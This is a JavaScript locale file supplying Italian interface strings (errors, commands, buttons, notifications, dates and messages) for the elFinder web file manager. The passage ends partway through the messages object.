/**
 * Italiano translation
 * @author Alberto Tocci (alberto.tocci@gmail.com)
 * @author Claudio Nicora (coolsoft.ita@gmail.com)
 * @author Stefano Galeazzi <stefano.galeazzi@probanet.it>
 * @author Thomas Camaran <camaran@gmail.com>
 * @version 2022-03-02
 */
 (function(root, factory) {
	if (typeof define === 'function' && define.amd) {
		define(['elfinder'], factory);
	} else if (typeof exports !== 'undefined') {
		module.exports = factory(require('elfinder'));
	} else {
		factory(root.elFinder);
	}
}(this, function(elFinder) {
	elFinder.prototype.i18.it = {
		translator : 'Alberto Tocci (alberto.tocci@gmail.com), Claudio Nicora (coolsoft.ita@gmail.com), Stefano Galeazzi &lt;stefano.galeazzi@probanet.it&gt;, Thomas Camaran &lt;camaran@gmail.com&gt;',
		language   : 'Italiano',
		direction  : 'ltr',
		dateFormat : 'd/m/Y H:i', // will show like: 02/03/2022 12:52
		fancyDateFormat : '$1 H:i', // will show like: Oggi 12:52
		nonameDateFormat : 'ymd-His', // noname upload will show like: 220302-125236
		messages   : {
			'getShareText' : 'Condividere',
			'Editor ': 'Editor di codice',

			/********************************** errors **********************************/
			'error'                : 'Errore',
			'errUnknown'           : 'Errore sconosciuto.',
			'errUnknownCmd'        : 'Comando sconosciuto.',
			'errJqui'              : 'Configurazione JQuery UI non valida. Devono essere inclusi i plugin Selectable, Draggable e Droppable.',
			'errNode'              : 'elFinder necessita dell\'elemento DOM per essere inizializzato.',
			'errURL'               : 'Configurazione non valida.Il parametro URL non è settato.',
			'errAccess'            : 'Accesso negato.',
			'errConnect'           : 'Impossibile collegarsi al backend.',
			'errAbort'             : 'Connessione annullata.',
			'errTimeout'           : 'Timeout di connessione.',
			'errNotFound'          : 'Backend non trovato.',
			'errResponse'          : 'Risposta non valida dal backend.',
			'errConf'              : 'Configurazione backend non valida.',
			'errJSON'              : 'Modulo PHP JSON non installato.',
			'errNoVolumes'         : 'Non è stato possibile leggere i volumi.',
			'errCmdParams'         : 'Parametri non validi per il comando "$1".',
			'errDataNotJSON'       : 'I dati non sono nel formato JSON.',
			'errDataEmpty'         : 'Stringa vuota.',
			'errCmdReq'            : 'La richiesta al backend richiede il nome del comando.',
			'errOpen'              : 'Impossibile aprire "$1".',
			'errNotFolder'         : 'L\'oggetto non è una cartella..',
			'errNotFile'           : 'L\'oggetto non è un file.',
			'errRead'              : 'Impossibile leggere "$1".',
			'errWrite'             : 'Non è possibile scrivere in "$1".',
			'errPerm'              : 'Permesso negato.',
			'errLocked'            : '"$1" è bloccato e non può essere rinominato, spostato o eliminato.',
			'errExists'            : 'Il file "$1" è già esistente.',
			'errInvName'           : 'Nome file non valido.',
			'errInvDirname'        : 'Nome cartella non valido.',  // from v2.1.24 added 12.4.2017
			'errFolderNotFound'    : 'Cartella non trovata.',
			'errFileNotFound'      : 'File non trovato.',
			'errTrgFolderNotFound' : 'La cartella di destinazione"$1" non è stata trovata.',
			'errPopup'             : 'Il tuo Browser non consente di aprire finestre di pop-up. Per aprire il file abilita questa opzione nelle impostazioni del tuo Browser.',
			'errMkdir'             : 'Impossibile creare la cartella "$1".',
			'errMkfile'            : 'Impossibile creare il file "$1".',
			'errRename'            : 'Impossibile rinominare "$1".',
			'errCopyFrom'          : 'Non è possibile copiare file da "$1".',
			'errCopyTo'            : 'Non è possibile copiare file in "$1".',
			'errMkOutLink'         : 'Impossibile creare un link all\'esterno della radice del volume.', // from v2.1 added 03.10.2015
			'errUpload'            : 'Errore di Caricamento.',  // old name - errUploadCommon
			'errUploadFile'        : 'Impossibile Caricare "$1".', // old name - errUpload
			'errUploadNoFiles'     : 'Non sono stati specificati file da caricare.',
			'errUploadTotalSize'   : 'La dimensione totale dei file supera il limite massimo consentito.', // old name - errMaxSize
			'errUploadFileSize'    : 'Le dimensioni del file superano il massimo consentito.', //  old name - errFileMaxSize
			'errUploadMime'        : 'FileType non consentito.',
			'errUploadTransfer'    : 'Trasferimento errato del file "$1".',
			'errUploadTemp'        : 'Impossibile creare il file temporaneo per l\'upload.', // from v2.1 added 26.09.2015
			'errNotReplace'        : 'L\'oggetto "$1" esiste già in questa cartella e non può essere sostituito con un oggetto di un tipo differente.', // new
			'errReplace'           : 'Impossibile sostituire "$1".',
			'errSave'              : 'Impossibile salvare "$1".',
			'errCopy'              : 'Impossibile copiare "$1".',
			'errMove'              : 'Impossibile spostare "$1".',
			'errCopyInItself'      : 'Sorgente e destinazione risultato essere uguali.',
			'errRm'                : 'Impossibile rimuovere "$1".',
			'errTrash'             : 'Impossibile cestinare.', // from v2.1.24 added 30.4.2017
			'errRmSrc'             : 'Impossibile eliminare i file origine.',
			'errExtract'           : 'Impossibile estrarre file da "$1".',
			'errArchive'           : 'Impossibile creare archivio.',
			'errArcType'           : 'Tipo di archivio non supportato.',
			'errNoArchive'         : 'Il file non è un archivio o contiene file non supportati.',
			'errCmdNoSupport'      : 'Il Backend non supporta questo comando.',
			'errReplByChild'       : 'La cartella $1 non può essere sostituita da un oggetto in essa contenuto.',
			'errArcSymlinks'       : 'Per questioni di sicurezza non è possibile estrarre archivi che contengono collegamenti..', // edited 24.06.2012
			'errArcMaxSize'        : 'La dimensione dell\'archivio supera le massime dimensioni consentite.',
			'errResize'            : 'Impossibile ridimensionare "$1".',
			'errResizeDegree'      : 'Angolo di rotazione non valido.',  // added 7.3.2013
			'errResizeRotate'      : 'Impossibile ruotare l\'immagine.',  // added 7.3.2013
			'errResizeSize'        : 'Dimensione dell\'immagine non valida.',  // added 7.3.2013
			'errResizeNoChange'    : 'Dimensione dell\'immagine non modificata.',  // added 7.3.2013
			'errUsupportType'      : 'Tipo di file non supportato.',
			'errNotUTF8Content'    : 'Il file "$1" non è nel formato UTF-8 e non può essere modificato.',  // added 9.11.2011
			'errNetMount'          : 'Impossibile montare "$1".', // added 17.04.2012
			'errNetMountNoDriver'  : 'Protocollo non supportato.',     // added 17.04.2012
			'errNetMountFailed'    : 'Mount fallito.',         // added 17.04.2012
			'errNetMountHostReq'   : 'Host richiesto.', // added 18.04.2012
			'errSessionExpires'    : 'La sessione è scaduta a causa di inattività.',
			'errCreatingTempDir'   : 'Impossibile creare la cartella temporanea: "$1"',
			'errFtpDownloadFile'   : 'Impossibile scaricare il file tramite FTP: "$1"',
			'errFtpUploadFile'     : 'Impossibile caricare il file tramite FTP: "$1"',
			'errFtpMkdir'          : 'Impossibile creare la cartella remota tramite FTP: "$1"',
			'errArchiveExec'       : 'Errore durante l\'archiviazione dei file: "$1"',
			'errExtractExec'       : 'Errore durante l\'estrazione dei file: "$1"',
			'errNetUnMount'        : 'Impossibile smontare', // from v2.1 added 30.04.2012
			'errConvUTF8'          : 'Non convertibile nel formato UTF-8', // from v2.1 added 08.04.2014
			'errFolderUpload'      : 'Per uploadare l0intera cartella usare Google Chrome.', // from v2.1 added 26.6.2015
			'errSearchTimeout'     : 'Timeout durante la ricerca di "$1". I risultati della ricerca sono parziali.', // from v2.1 added 12.1.2016
			'errReauthRequire'     : 'E\' necessaria la riautorizzazione.', // from v2.1.10 added 24.3.2016
			'errMaxTargets'        : 'Il numero massimo di oggetti selezionabili è $1.', // from v2.1.17 added 17.10.2016
			'errRestore'           : 'Impossibile ripristinare dal cestino: destinazione di ripristino non trovata.', // from v2.1.24 added 3.5.2017
			'errEditorNotFound'    : 'Impossibile trovare un editor per questo tipo di file.', // from v2.1.25 added 23.5.2017
			'errServerError'       : 'Si è verificato un errore lato server.', // from v2.1.25 added 16.6.2017
			'errEmpty'             : 'Impossibile svuotare la cartella "$1".', // from v2.1.25 added 22.6.2017
			'moreErrors'           : 'Ci sono $ 1 in più di errori.', // from v2.1.44 added 9.12.2018
			'errMaxMkdirs'         : 'Puoi creare fino a $ 1 cartelle alla volta.', // from v2.1.58 added 20.6.2021

			/******************************* commands names ********************************/
			'cmdarchive'   : 'Crea archivio',
			'cmdback'      : 'Indietro',
			'cmdcopy'      : 'Copia',
			'cmdcut'       : 'Taglia',
			'cmddownload'  : 'Scarica',
			'cmdduplicate' : 'Duplica',
			'cmdedit'      : 'Modifica File',
			'cmdextract'   : 'Estrai Archivio',
			'cmdforward'   : 'Avanti',
			'cmdgetfile'   : 'Seleziona File',
			'cmdhelp'      : 'Informazioni su...',
			'cmdhome'      : 'Home',
			'cmdinfo'      : 'Informazioni',
			'cmdmkdir'     : 'Nuova cartella',
			'cmdmkdirin'   : 'In una nuova cartella', // from v2.1.7 added 19.2.2016
			'cmdmkfile'    : 'Nuovo file',
			'cmdopen'      : 'Apri',
			'cmdpaste'     : 'Incolla',
			'cmdquicklook' : 'Anteprima',
			'cmdreload'    : 'Ricarica',
			'cmdrename'    : 'Rinomina',
			'cmdrm'        : 'Elimina',
			'cmdtrash'     : 'Nel cestino', //from v2.1.24 added 29.4.2017
			'cmdrestore'   : 'Ripristina', //from v2.1.24 added 3.5.2017
			'cmdsearch'    : 'Ricerca file',
			'cmdup'        : 'Vai alla directory padre',
			'cmdupload'    : 'Carica File',
			'cmdview'      : 'Visualizza',
			'cmdresize'    : 'Ridimensiona Immagine',
			'cmdsort'      : 'Ordina',
			'cmdnetmount'  : 'Monta disco di rete', // added 18.04.2012
			'cmdnetunmount': 'Smonta', // from v2.1 added 30.04.2012
			'cmdplaces'    : 'Aggiungi ad Accesso rapido', // added 28.12.2014
			'cmdchmod'     : 'Cambia modalità', // from v2.1 added 20.6.2015
			'cmdopendir'   : 'Apri una cartella', // from v2.1 added 13.1.2016
			'cmdcolwidth'  : 'Reimposta dimensione colonne', // from v2.1.13 added 12.06.2016
			'cmdfullscreen': 'Schermo intero', // from v2.1.15 added 03.08.2016
			'cmdmove'      : 'Sposta', // from v2.1.15 added 21.08.2016
			'cmdempty'     : 'Svuota la cartella', // from v2.1.25 added 22.06.2017
			'cmdundo'      : 'Annulla', // from v2.1.27 added 31.07.2017
			'cmdredo'      : 'Ripeti', // from v2.1.27 added 31.07.2017
			'cmdpreference': 'Preferenze', // from v2.1.27 added 03.08.2017
			'cmdselectall' : 'Seleziona tutto', // from v2.1.28 added 15.08.2017
			'cmdselectnone': 'Annulla selezione', // from v2.1.28 added 15.08.2017
			'cmdselectinvert': 'Inverti selezione', // from v2.1.28 added 15.08.2017
			'cmdopennew'   : 'Apri in una nuova finestra', // from v2.1.38 added 3.4.2018
			'cmdhide'      : 'Nascondi (Preferenza)', // from v2.1.41 added 24.7.2018

			/*********************************** buttons ***********************************/
			'btnClose'  : 'Chiudi',
			'btnSave'   : 'Salva',
			'btnRm'     : 'Elimina',
			'btnApply'  : 'Applica',
			'btnCancel' : 'Annulla',
			'btnNo'     : 'No',
			'btnYes'    : 'Sì',
			'btnMount'  : 'Monta',  // added 18.04.2012
			'btnApprove': 'Vai a $1 & approva', // from v2.1 added 26.04.2012
			'btnUnmount': 'Smonta', // from v2.1 added 30.04.2012
			'btnConv'   : 'Converti', // from v2.1 added 08.04.2014
			'btnCwd'    : 'Qui',      // from v2.1 added 22.5.2015
			'btnVolume' : 'Disco',    // from v2.1 added 22.5.2015
			'btnAll'    : 'Tutti',       // from v2.1 added 22.5.2015
			'btnMime'   : 'Tipo MIME', // from v2.1 added 22.5.2015
			'btnFileName':'Nome file',  // from v2.1 added 22.5.2015
			'btnSaveClose': 'Salva & Chiudi', // from v2.1 added 12.6.2015
			'btnBackup' : 'Backup', // fromv2.1 added 28.11.2015
			'btnRename'    : 'Rinomina',      // from v2.1.24 added 6.4.2017
			'btnRenameAll' : 'Rinomina (tutto)', // from v2.1.24 added 6.4.2017
			'btnPrevious' : 'Indietro ($1/$2)', // from v2.1.24 added 11.5.2017
			'btnNext'     : 'Avanti ($1/$2)', // from v2.1.24 added 11.5.2017
			'btnSaveAs'   : 'Salva come', // from v2.1.25 added 24.5.2017

			/******************************** notifications ********************************/
			'ntfopen'     : 'Apri cartella',
			'ntffile'     : 'Apri file',
			'ntfreload'   : 'Ricarica il contenuto della cartella',
			'ntfmkdir'    : 'Creazione delle directory in corso',
			'ntfmkfile'   : 'Creazione dei files in corso',
			'ntfrm'       : 'Eliminazione dei files in corso',
			'ntfcopy'     : 'Copia file in corso',
			'ntfmove'     : 'Spostamento file in corso',
			'ntfprepare'  : 'Preparazione della copia dei file.',
			'ntfrename'   : 'Sto rinominando i file',
			'ntfupload'   : 'Caricamento file in corso',
			'ntfdownload' : 'Downloading file in corso',
			'ntfsave'     : 'Salvataggio file in corso',
			'ntfarchive'  : 'Creazione archivio in corso',
			'ntfextract'  : 'Estrazione file dall\'archivio in corso',
			'ntfsearch'   : 'Ricerca files in corso',
			'ntfresize'   : 'Ridimensionamento immagini',
			'ntfsmth'     : 'Operazione in corso. Attendere...',
			'ntfloadimg'  : 'Caricamento immagine in corso',
			'ntfnetmount' : 'Montaggio disco di rete', // added 18.04.2012
			'ntfnetunmount': 'Smontaggio disco di rete', // from v2.1 added 30.04.2012
			'ntfdim'      : 'Lettura dimensioni immagine', // added 20.05.2013
			'ntfreaddir'  : 'Lettura informazioni cartella', // from v2.1 added 01.07.2013
			'ntfurl'      : 'Lettura URL del collegamento', // from v2.1 added 11.03.2014
			'ntfchmod'    : 'Modifica della modalità del file', // from v2.1 added 20.6.2015
			'ntfpreupload': 'Verifica del nome del file caricato', // from v2.1 added 31.11.2015
			'ntfzipdl'    : 'Creazione del file da scaricare', // from v2.1.7 added 23.1.2016
			'ntfparents'  : 'Ottenimento informazioni percorso', // from v2.1.17 added 2.11.2016
			'ntfchunkmerge': 'Processazione file caricato', // from v2.1.17 added 2.11.2016
			'ntftrash'    : 'Spostamento nel cestino', // from v2.1.24 added 2.5.2017
			'ntfrestore'  : 'Ripristino dal cestino', // from v2.1.24 added 3.5.2017
			'ntfchkdir'   : 'Controllo cartella destinazione', // from v2.1.24 added 3.5.2017
			'ntfundo'     : 'Annullamento operazione precedente', // from v2.1.27 added 31.07.2017
			'ntfredo'     : 'Rifacimento precedente annullamento', // from v2.1.27 added 31.07.2017
			'ntfchkcontent' : 'Controllo dei contenuti', // from v2.1.41 added 3.8.2018

			/*********************************** volumes *********************************/
			'volume_Trash' : 'Cestino', //from v2.1.24 added 29.4.2017

			/************************************ dates **********************************/
			'dateUnknown' : 'Sconosciuto',
			'Today'       : 'Oggi',
			'Yesterday'   : 'Ieri',
			'msJan'       : 'Gen',
			'msFeb'       : 'febbraio',
			'msMar'       : 'Mar',
			'msApr'       : 'aprile',
			'msMay'       : 'Mag',
			'msJun'       : 'Giu',
			'msJul'       : 'Lug',
			'msAug'       : 'Ago',
			'msSep'       : 'Set',
			'msOct'       : 'Ott',
			'msNov'       : 'Nov',
			'msDec'       : 'Dic',
			'January'     : 'Gennaio',
			'February'    : 'Febbraio',
			'March'       : 'Marzo',
			'April'       : 'Aprile',
			'May'         : 'Maggio',
			'June'        : 'Giugno',
			'July'        : 'Luglio',
			'August'      : 'Agosto',
			'September'   : 'Settembre',
			'October'     : 'Ottobre',
			'November'    : 'Novembre',
			'December'    : 'Dicembre',
			'Sunday'      : 'Domenica',
			'Monday'      : 'Lunedì',
			'Tuesday'     : 'Martedì',
			'Wednesday'   : 'Mercoledì',
			'Thursday'    : 'Giovedì',
			'Friday'      : 'Venerdì',
			'Saturday'    : 'Sabato',
			'Sun'         : 'Dom',
			'Mon'         : 'Lun',
			'Tue'         : 'Mar',
			'Wed'         : 'Mer',
			'Thu'         : 'Gio',
			'Fri'         : 'Ven',
			'Sat'         : 'Sab',

			/******************************** sort variants ********************************/
			'sortname'          : 'per nome',
			'sortkind'          : 'per tipo',
			'sortsize'          : 'per dimensione',
			'sortdate'          : 'per data',
			'sortFoldersFirst'  : 'cartelle in testa',
			'sortperm'          : 'per permessi', // from v2.1.13 added 13.06.2016
			'sortmode'          : 'per modalità',       // from v2.1.13 added 13.06.2016
			'sortowner'         : 'per possessore',      // from v2.1.13 added 13.06.2016
			'sortgroup'         : 'per gruppo',      // from v2.1.13 added 13.06.2016
			'sortAlsoTreeview'  : 'Anche vista ad albero',  // from v2.1.15 added 01.08.2016

			/********************************** new items **********************************/
			'untitled file.txt' : 'NuovoFile.txt', // added 10.11.2015
			'untitled folder'   : 'NuovaCartella',   // added 10.11.2015
			'Archive'           : 'NuovoArchivio',  // from v2.1 added 10.11.2015
			'untitled file'     : 'NuovoFile.$1',  // from v2.1.41 added 6.8.2018
			'extentionfile'     : '$1: file',    // from v2.1.41 added 6.8.2018
			'extentiontype'     : '$1: $2',      // from v2.1.43 added 17.10.2018

			/********************************** messages **********************************/
			'confirmReq'      : 'Conferma richiesta',
			'confirmRm'       : 'Sei sicuro di voler eliminare i file?<br />L\'operazione non è reversibile!',
			'confirmRepl'     : 'Sostituire i file ?',
			'confirmRest'     : 'Rimpiazza l\'oggetto esistente con quello nel cestino?', // fromv2.1.24 added 5.5.2017
			'confirmConvUTF8' : 'Non in formato UTF-8<br/>Convertire in UTF-8?<br/>Il contenuto diventerà UTF-8 salvando dopo la conversione.', // from v2.1 added 08.04.2014
			'confirmNonUTF8'  : 'La codifica caratteri di questo file non può essere determinata. Sarà temporaneamente convertito in UTF-8 per l\'editting.<br/>Per cortesia, selezionare la codifica caratteri per il file.', // from v2.1.19 added 28.11.2016
			'confirmNotSave'  : 'Il contenuto è stato modificato.<br/>Le modifiche andranno perse se non si salveranno.', // from v2.1 added 15.7.2015
			'confirmTrash'    : 'Sei sicuro di voler cestinare gli oggetti?', //from v2.1.24 added 29.4.2017
			'confirmMove'     : 'Sei sicuro di voler spostare gli articoli a "$ 1"?', //from v2.1.50 added 27.7.2019
			'apllyAll'        : 'Applica a tutti',
			'name'            : 'Nome',
			'size'            : 'Dimensione',
			'perms'           : 'Permessi',
			'modify'          : 'Modificato il',
			'kind'            : 'Tipo',
			'read'            : 'lettura',
			'write'           : 'scrittura',
			'noaccess'        : 'nessun accesso',
			'and'             : 'e',
			'unknown'         : 'sconosciuto',
			'selectall'       : 'Seleziona tutti i file',
			'selectfiles'     : 'Seleziona file',
			'selectffile'     : 'Seleziona il primo file',
			'selectlfile'     : 'Seleziona l\'ultimo file',
			'viewlist'        : 'Visualizza Elenco',
			'viewicons'       : 'Visualizza Icone',
			'viewSmall'       : 'Icone piccole', // from v2.1.39 added 22.5.2018
			'viewMedium'      : 'Icone medie', // from v2.1.39 added 22.5.2018
			'viewLarge'       : 'Icone grandi', // from v2.1.39 added 22.5.2018
			'viewExtraLarge'  : 'Icone molto grandi', // from v2.1.39 added 22.5.2018
			'places'          : 'Accesso rapido',
			'calc'            : 'Calcola',
			'path'            : 'Percorso',
			'aliasfor'        : 'Alias per',
			'locked'          : 'Bloccato',
			'dim'             : 'Dimensioni',
			'files'           : 'File',
			'folders'         : 'Cartelle',
			'items'           : 'Oggetti',
			'yes'             : 'sì',
			'no'              : 'no',
			'link'            : 'Collegamento',
			'searcresult'     : 'Risultati ricerca',
			'selected'        : 'oggetti selezionati',
			'about'           : 'Informazioni',
			'shortcuts'       : 'Scorciatoie',
			'help'            : 'Aiuto',
			'webfm'           : 'Gestore file WEB',
			'ver'             : 'Versione',
			'protocolver'     : 'versione protocollo',
			'homepage'        : 'Home del progetto',
			'docs'            : 'Documentazione',
			'github'          : 'Seguici su Github',
			'twitter'         : 'Seguici su Twitter',
			'facebook'        : 'Seguici su Facebook',
			'team'            : 'Gruppo',
			'chiefdev'        : 'sviluppatore capo',
			'developer'       : 'sviluppatore',
			'contributor'     : 'collaboratore',
			'maintainer'      : 'manutentore',
			'translator'      : 'traduttore',
			'icons'           : 'Icone',
			'dontforget'      : 'e non dimenticate di portare l\'asciugamano',
			'shortcutsof'     : 'Scorciatoie disabilitate',
			'dropFiles'       : 'Trascina i file qui',
			'or'              : 'o',
			'selectForUpload' : 'Seleziona file da caricare',
			'moveFiles'       : 'Sposta file',
			'copyFiles'       : 'Copia file',
			'restoreFiles'    : 'Ripristina oggetti', // from v2.1.24 added 5.5.2017
			'rmFromPlaces'    : 'Rimuovi da Accesso rapido',
			'aspectRatio'     : 'Proporzioni',
			'scale'           : 'Scala',
			'width'           : 'Larghezza',
			'height'          : 'Altezza',
			'resize'          : 'Ridimensione',
			'crop'            : 'Ritaglia',
			'rotate'          : 'Ruota',
			'rotate-cw'       : 'Ruota di 90° in senso orario',
			'rotate-ccw'      : 'Ruota di 90° in senso antiorario',
			'degree'          : 'Gradi',
			'netMountDialogTitle' : 'Monta disco di rete', // added 18.04.2012
			'protocol'            : 'Protocollo', // added 18.04.2012
			'host'                : 'Ospite', // added 18.04.2012
			'port'                : 'Porta', // added 18.04.2012
			'user'                : 'Utente', // added 18.04.2012
			'pass'                : 'Parola d\'ordine', // added 18.04.2012
			'confirmUnmount'      : 'Vuoi smontare $1?',  // from v2.1 added 30.04.2012
			'dropFilesBrowser': 'Rilascia o incolla dal browser', // from v2.1 added 30.05.2012
			'dropPasteFiles'  : 'Rilascia o incolla files e indirizzi URL qui', // from v2.1 added 07.04.2014
			'encoding'        : 'Codifica', // from v2.1 added 19.12.2014
			'locale'          : 'Lingua',   // from v2.1 added 19.12.2014
			'searchTarget'    : 'Destinazione: $1',                // from v2.1 added 22.5.2015
			'searchMime'      : 'Cerca per MIME Type', // from v2.1 added 22.5.2015
			'owner'           : 'Possessore', // from v2.1 added 20.6.2015
			'group'           : 'Gruppo', // from v2.1 added 20.6.2015
			'other'           : 'Altri', // from v2.1 added 20.6.2015
			'execute'         : 'Esegui', // from v2.1 added 20.6.2015
			'perm'            : 'Permessi', // from v2.1 added 20.6.2015
			'mode'            : 'Modalità', // from v2.1 added 20.6.2015
			'emptyFolder'     : 'La cartella è vuota', // from v2.1.6 added 30.12.2015
			'emptyFolderDrop' : 'La cartella è vuota\\A Trascina e rilascia per aggiungere elementi', // from v2.1.6 added 30.12.2015
			'emptyFolderLTap' : 'La cartella è vuota\\A Premi a lungo per aggiungere elementi', // from v2.1.6 added 30.12.2015
			'quality'         : 'Qualità', // from v2.1.6 added 5.1.2016
			'autoSync'        : 'Sincr. automatica',  // from v2.1.6 added 10.1.2016
			'moveUp'          : 'Sposta in alto',  // from v2.1.6 added 18.1.2016
			'getLink'         : 'Mostra URL link', // from v2.1.7 added 9.2.2016
			'selectedItems'   : 'Elementi selezionati ($1)', // from v2.1.7 added 2.19.2016
			'folderId'        : 'ID cartella', // from v2.1.10 added 3.25.2016
			'offlineAccess'   : 'Permetti accesso non in linea', // from v2.1.10 added 3.25.2016
			'reAuth'          : 'Per ri-autenticarsi', // from v2.1.10 added 3.25.2016
			'nowLoading'      : 'Caricamento...', // from v2.1.12 added 4.26.2016
			'openMulti'       : 'Apri più files', // from v2.1.12 added 5.14.2016
			'openMultiConfirm': 'Stai cercando di aprire $1 files. Sei sicuro di volerli aprire nel browser?', // from v2.1.12 added 5.14.2016
			'emptySearch'     : 'Nessun risultato soddisfa i criteri di ricerca', // from v2.1.12 added 5.16.2016
			'editingFile'     : 'Il file è in modifica.', // from v2.1.13 added 6.3.2016
			'hasSelected'     : '$1 elementi sono selezionati.', // from v2.1.13 added 6.3.2016
			'hasClipboard'    : '$1 elementi negli appunti.', // from v2.1.13 added 6.3.2016
			'incSearchOnly'   : 'La ricerca incrementale è solo dalla vista corrente.', // from v2.1.13 added 6.30.2016
			'reinstate'       : 'Reistanzia', // from v2.1.15 added 3.8.2016
			'complete'        : '$1 completato', // from v2.1.15 added 21.8.2016
			'contextmenu'     : 'Menu contestuale', // from v2.1.15 added 9.9.2016
			'pageTurning'     : 'Orientamento pagina', // from v2.1.15 added 10.9.2016
			'volumeRoots'     : 'Percorsi base del volume', // from v2.1.16 added 16.9.2016
			'reset'           : 'Resetta', // from v2.1.16 added 1.10.2016
			'bgcolor'         : 'Colore di sfondo', // from v2.1.16 added 1.10.2016
			'colorPicker'     : 'Selettore colori', // from v2.1.16 added 1.10.2016
			'8pxgrid'         : 'Griglia di 8px', // from v2.1.16 added 4.10.2016
			'enabled'         : 'Abilitato', // from v2.1.16 added 4.10.2016
			'disabled'        : 'Disabilitato', // from v2.1.16 added 4.10.2016
			'emptyIncSearch'  : 'Nessun risultato di ricerca nella vista corrente\\APremere [Invio] per espandere l\'oggetto della ricerca.', // from v2.1.16 added 5.10.2016
			'emptyLetSearch'  : 'Nessun risultato di ricerca tramite prima lettera nella vista corrente.', // from v2.1.23 added 24.3.2017
			'textLabel'       : 'Etichetta di testo', // from v2.1.17 added 13.10.2016
			'minsLeft'        : '$1 minuti rimanenti', // from v2.1.17 added 13.11.2016
			'openAsEncoding'  : 'Riapri con la codifica di caratteri selezionata', // from v2.1.19 added 2.12.2016
			'saveAsEncoding'  : 'Salva con la codifica di caratteri selezionata', // from v2.1.19 added 2.12.2016
			'selectFolder'    : 'Seleziona cartella', // from v2.1.20 added 13.12.2016
			'firstLetterSearch': 'Cerca tramite la prima lettera', // from v2.1.23 added 24.3.2017
			'presets'         : 'Opzioni predefinite', // from v2.1.25 added 26.5.2017
			'tooManyToTrash'  : 'Troppi oggetti da spostare nel cestino', // from v2.1.25 added 9.6.2017
			'TextArea'        : 'Area di testo', // from v2.1.25 added 14.6.2017
			'folderToEmpty'   : 'Svuota la cartella "$1".', // from v2.1.25 added 22.6.2017
			'filderIsEmpty'   : 'Non ci sono oggetti nella cartella "$1".', // from v2.1.25 added 22.6.2017
			'preference'      : 'Preferenze', // from v2.1.26 added 28.6.2017
			'language'        : 'Impostazioni Lingua', // from v2.1.26 added 28.6.2017
			'clearBrowserData': 'Inizializza le impostazioni salvate nel browser', // from v2.1.26 added 28.6.2017
			'toolbarPref'     : 'Impostazioni ToolBar', // from v2.1.27 added 2.8.2017
			'charsLeft'       : '... $1 caratteri rimanenti.',  // from v2.1.29 added 30.8.2017
			'linesLeft'       : '... $ 1 righe rimaste.',  // from v2.1.52 added 16.1.2020
			'sum'             : 'Somma', // from v2.1.29 added 28.9.2017
			'roughFileSize'   : 'Dimensione file approssimativa', // from v2.1.30 added 2.11.2017
			'autoFocusDialog' : 'Fuoco sull\'elemento sotto al mouse',  // from v2.1.30 added 2.11.2017
			'select'          : 'Seleziona', // from v2.1.30 added 23.11.2017
			'selectAction'    : 'Azione quando un file è selezionato', // from v2.1.30 added 23.11.2017
			'useStoredEditor' : 'Apri con l\'editor usato l\'ultima volta', // from v2.1.30 added 23.11.2017
			'selectinvert'    : 'Inverti selezione', // from v2.1.30 added 25.11.2017
			'renameMultiple'  : 'Sei sicuro di voler rinominare $1 selezionati come $2?<br/>Questo non può essere annullato!', // from v2.1.31 added 4.12.2017
			'batchRename'     : 'Rinomina in batch', // from v2.1.31 added 8.12.2017
			'plusNumber'      : '+ Numero', // from v2.1.31 added 8.12.2017
			'asPrefix'        : 'Aggiungi prefisso', // from v2.1.31 added 8.12.2017
			'asSuffix'        : 'Aggiungi sufisso', // from v2.1.31 added 8.12.2017
			'changeExtention' : 'Cambia estensione', // from v2.1.31 added 8.12.2017
			'columnPref'      : 'Impostazioni delle colonne (visualizzazione elenco)', // from v2.1.32 added 6.2.2018
			'reflectOnImmediate' : 'Tutti i cambiamenti saranno immeditamente applicati.', // from v2.1.33 added 2.3.2018
			'reflectOnUnmount'   : 'Qualsiasi modifica non sarà visibile fino a quando non si monta questo volume.', // from v2.1.33 added 2.3.2018
			'unmountChildren' : 'Anche i seguenti volumi montati su questo volume smontati. Sei sicuro di smontarlo?', // from v2.1.33 added 5.3.2018
			'selectionInfo'   : 'Seleziona Info', // from v2.1.33 added 7.3.2018
			'hashChecker'     : 'Algoritmi per visualizzare l\'hash del file', // from v2.1.33 added 10.3.2018
			'infoItems'       : 'Informazioni (pannello di informazioni sulla selezione)', // from v2.1.38 added 28.3.2018
			'pressAgainToExit': 'Premi di nuovo per uscire.', // from v2.1.38 added 1.4.2018
			'toolbar'         : 'Barra degli strumenti', // from v2.1.38 added 4.4.2018
			'workspace'       : 'Spazio di lavoro', // from v2.1.38 added 4.4.2018
			'dialog'          : 'Dialogo', // from v2.1.38 added 4.4.2018
			'all'             : 'Tutti', // from v2.1.38 added 4.4.2018
			'iconSize'        : 'Dimensione icona (Visualizzazione icone)', // from v2.1.39 added 7.5.2018
			'editorMaximized' : 'Apri la finestra dell\'editor ingrandita', // from v2.1.40 added 30.6.2018
			'editorConvNoApi' : 'Poiché la conversione tramite API non è attualmente disponibile, converti sul sito web.', //from v2.1.40 added 8.7.2018
			'editorConvNeedUpload' : 'Dopo la conversione, devi essere caricato con l\'URL dell\'elemento o un file scaricato per salvare il file convertito.', //from v2.1.40 added 8.7.2018
			'convertOn'       : 'Converti sul sito di $ 1', // from v2.1.40 added 10.7.2018
			'integrations'    : 'Integrazioni', // from v2.1.40 added 11.7.2018
			'integrationWith' : 'Questo elFinder ha i seguenti servizi esterni integrati. Si prega di verificare i termini di utilizzo, l\'informativa sulla privacy, ecc. prima di utilizzarlo.', // from v2.1.40 added 11.7.2018
			'showHidden'      : 'Mostra elementi nascosti', // from v2.1.41 added 24.7.2018
			'hideHidden'      : 'Nascondi oggetti nascosti', // from v2.1.41 added 24.7.2018
			'toggleHidden'    : 'Mostra/Nascondi elementi nascosti', // from v2.1.41 added 24.7.2018
			'makefileTypes'   : 'Tipi di file da abilitare con "Nuovo file"', // from v2.1.41 added 7.8.2018
			'typeOfTextfile'  : 'Tipo di file di testo', // from v2.1.41 added 7.8.2018
			'add'             : 'Aggiungere', // from v2.1.41 added 7.8.2018
			'theme'           : 'Tema', // from v2.1.43 added 19.10.2018
			'default'         : 'predefinita', // from v2.1.43 added 19.10.2018
			'description'     : 'Descrizione', // from v2.1.43 added 19.10.2018
			'website'         : 'Sito web', // from v2.1.43 added 19.10.2018
			'author'          : 'autrice', // from v2.1.43 added 19.10.2018
			'email'           : 'E-mail', // from v2.1.43 added 19.10.2018
			'license'         : 'Licenza', // from v2.1.43 added 19.10.2018
